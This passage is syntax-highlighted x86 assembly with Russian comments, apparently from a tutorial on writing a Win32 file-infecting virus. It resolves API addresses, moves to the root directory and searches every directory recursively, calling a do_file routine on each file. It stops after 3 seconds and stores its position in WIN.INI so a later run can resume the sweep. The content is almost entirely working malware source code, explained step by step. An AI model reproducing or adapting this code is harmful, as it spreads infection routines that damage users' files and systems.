                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_apis</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">set_new_api_name</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">set_new_api_name</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0"> </span><span class="sc1">; Это идет сразу за</span><span class="sc0">
                                                </span><span class="sc1">; последним именем API</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">search4apis</span><span class="sc0">
</span><span class="sc1">; Теперь у нас есть все необходимые API.</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">prepare_file_search</span><span class="sc0">
</span><span class="sc5">no_apis</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">prepare_file_search</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">; Сохраним текущую директорию.</span><span class="sc0">
</span><span class="sc1">; Вызов GetCurrentDirectoryA:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буффер для хранения полученного пути&gt;</span><span class="sc0">
</span><span class="sc1">;               push &lt;размер оного буффера&gt;</span><span class="sc0">
</span><span class="sc1">;               call GetCurrentDirectoryA</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current_dir</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Перейдем в корневую директорию.</span><span class="sc0">
</span><span class="sc1">; Вызов SetCurrentDirectoryA:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя директории&gt;</span><span class="sc0">
</span><span class="sc1">;               call SetCurrentDirectoryA</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">root_dir</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">get_string_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_dir</span><span class="sc0">
</span><span class="sc1">; Восстановим первичную директорию.</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current_dir</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">process_dir</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">get_string_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_first</span><span class="sc0">
</span><span class="sc1">; Получить строку, сохраненную в WIN.INI</span><span class="sc0">
</span><span class="sc1">; Вызов GetProfileString:</span><span class="sc0">
</span><span class="sc1">;               push &lt;размер буффера для возвращаемой строки&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;буфер для возвращаемой строки&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;строка, возвращаемая по-умолчанию</span><span class="sc0">
</span><span class="sc1">;                           (если искомой строки не обнаружено)</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя ключа в win.ini-файле&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя секции в win.ini-файле&gt;</span><span class="sc0">
</span><span class="sc1">;               call GetProfileStringA</span><span class="sc0">
</span><span class="sc1">;               EAX = Длина возвращаемой строки</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">default_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ini_key</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ini_section</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetProfileStringA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">get_string_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">catch_the_string</span><span class="sc0">
</span><span class="sc5">set_fuck_flag</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">start_timer</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">find_first</span><span class="sc0">
</span><span class="sc5">catch_the_string</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Сравним имена дисков из сохраненной строки и из каталога запуска</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current_dir</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">set_fuck_flag</span><span class="sc0">
</span><span class="sc1">; Подготовим сохраненную строку к работе - заменим все "\" на 0</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">saved_string</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Пропустим имя диска</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_ini_string</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">another_sign</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_slash</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finish_it</span><span class="sc0">
</span><span class="sc5">not_slash</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">find_first</span><span class="sc0">
</span><span class="sc5">finish_it</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">another_sign</span><span class="sc0">
</span><span class="sc5">find_first</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_ini_string</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc1">; Поищем в данной дире *.*</span><span class="sc0">
</span><span class="sc1">; Вызов FindFirstFileA:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;FIND структура&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;маска поиска&gt;</span><span class="sc0">
</span><span class="sc1">;               call FindFirstFileA</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findstruc</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maska</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">go_out</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_handler</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">compare_or_not</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">start_fuck</span><span class="sc0">
</span><span class="sc1">; Сравнить найденный элемент с элементом строки</span><span class="sc0">
</span><span class="sc1">; Вызов lstrcmpi:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;строка 1&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;строка 2&gt;</span><span class="sc0">
</span><span class="sc1">;               call lstrcmpi</span><span class="sc0">
</span><span class="sc1">;               EAX = 0 если строки равны</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_ini_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourlstrcmpi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">PROCDIR</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">; Поместить в start_ini_string адрес следующего элемента</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_ini_string</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">not_last</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_last</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_ini_string</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Обработать найденный элемент</span><span class="sc0">
</span><span class="sc5">start_fuck</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_attr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; Директория?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_file</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">test_time</span><span class="sc0">
</span><span class="sc5">dir</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc1">; Пропускать</span><span class="sc0">
                                                            </span><span class="sc1">; "." и ".."</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">PROCDIR</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">test_time</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_handler</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourSetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_dir</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_handler</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Пора смываться?</span><span class="sc0">
</span><span class="sc5">test_time</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">get_out_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">go_out</span><span class="sc0">
</span><span class="sc1">; Если мы еще не включали таймер - не проверять его значение</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_fuck_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_end_of_ini</span><span class="sc0">
</span><span class="sc1">; Проверить текущее значение таймера</span><span class="sc0">
</span><span class="sc1">; Вызов GetTickCount:</span><span class="sc0">
</span><span class="sc1">;               call GetTickCount</span><span class="sc0">
</span><span class="sc1">;               EAX = время в тиках с начала текущей сесии WINDOWS</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetTickCount</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0"> </span><span class="sc1">; 3 секунды</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">get_out_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">; Сохраним текущий путь в WIN.INI</span><span class="sc0">
</span><span class="sc1">; Получим текущий путь</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; Допишем туда "\" и имя последнего объекта</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ff_fullname</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">all_ok</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">all_ok</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">next_letter</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endets</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_letter</span><span class="sc0">
</span><span class="sc1">; Вызов WriteProfileString:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;строка для записи&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя ключа в win.ini&gt;</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя секции в win.ini&gt;</span><span class="sc0">
</span><span class="sc1">;               call WriteProfileStringA</span><span class="sc0">
</span><span class="sc5">endets</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">saved_string</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ini_key</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ini_section</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourWriteProfileStringA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">go_out</span><span class="sc0">
</span><span class="sc1">; Если текущий элемент сохраненной строки - последний, выставить флаг работы</span><span class="sc0">
</span><span class="sc5">check_end_of_ini</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_ini_string</span><span class="sc4">]</span><span class="sc0">
